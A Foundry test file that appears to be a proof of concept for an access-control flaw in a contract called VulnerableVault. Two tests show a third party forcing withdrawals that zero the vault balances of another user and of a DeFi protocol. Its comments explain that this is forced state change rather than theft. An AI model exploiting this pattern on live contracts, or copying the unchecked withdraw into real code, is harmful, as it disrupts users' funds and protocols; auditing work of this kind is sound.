// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";

contract AccessCtrlPoCTest is Test {
    VulnerableVault vault;
    address alice;
    address eve;

    function setUp() public {
        vault = new VulnerableVault();
        alice = makeAddr("alice");
        eve = makeAddr("eve");
        vm.deal(alice, 5 ether);
        vm.prank(alice);
        vault.deposit{value: 5 ether}();
    }

    // Test: Access control bug — anyone can trigger a withdrawal from any account
    // withdraw(payable(to), amount) checks balances[to] not balances[msg.sender]
    // No authorization check that msg.sender == to
    function test_eveForceWithdrawsAliceFunds() public {
        console2.log("=== ACCESS CONTROL BUG POC ===");
        console2.log("Alice vault balance before:", vault.balances(alice));
        console2.log("Alice ETH before:", address(alice).balance);
        console2.log("Eve ETH before:", address(eve).balance);
        console2.log("Vault ETH before:", address(vault).balance);

        // Eve calls withdraw specifying alice as the recipient
        // Funds go to alice (not eve), but alice never authorized this
        // This is a forced withdrawal DoS on contracts that cannot handle ETH receipt
        vm.prank(eve);
        vault.withdraw(payable(alice), 5 ether);
        
        console2.log("Alice vault balance after:", vault.balances(alice));
        console2.log("Alice ETH after (got her money back involuntarily):", address(alice).balance);
        console2.log("Eve ETH after (stayed 0, not direct theft):", address(eve).balance);
        
        // Confirm: eve could force alice's balance to zero
        assertEq(vault.balances(alice), 0, "Alice balance drained without consent");
        // Note: Eve cannot receive the ETH herself — only alice can
        // But the DoS / forced-state-change is the real vulnerability
    }

    // More critical: If 'to' is a contract address the attacker controls with balances, 
    // they can drain it. Combined with deposit, an attacker can set themselves as 'to'
    // and self-withdraw — but that's expected. 
    // Real risk: break DeFi integrations that keep ETH in vault and rely on specific withdrawal timing

    function test_anyone_can_drain_contractVault() public {
        // Scenario: A DeFi protocol has deposited ETH in the vault, waiting to use it
        // Attacker can force the withdrawal, disrupting the protocol's state machine
        address defiProtocol = makeAddr("defiProtocol");
        vm.deal(defiProtocol, 10 ether);
        vm.prank(defiProtocol);
        vault.deposit{value: 10 ether}();
        
        console2.log("DeFi Protocol vault balance:", vault.balances(defiProtocol));
        
        // Attacker (eve) forces withdrawal of the protocol's funds
        vm.prank(eve);
        vault.withdraw(payable(defiProtocol), 10 ether);
        
        assertEq(vault.balances(defiProtocol), 0, "Protocol vault balance drained by attacker");
        console2.log("Protocol vault balance after attack:", vault.balances(defiProtocol));
        console2.log("Protocol ETH recovered:", address(defiProtocol).balance);
    }
}
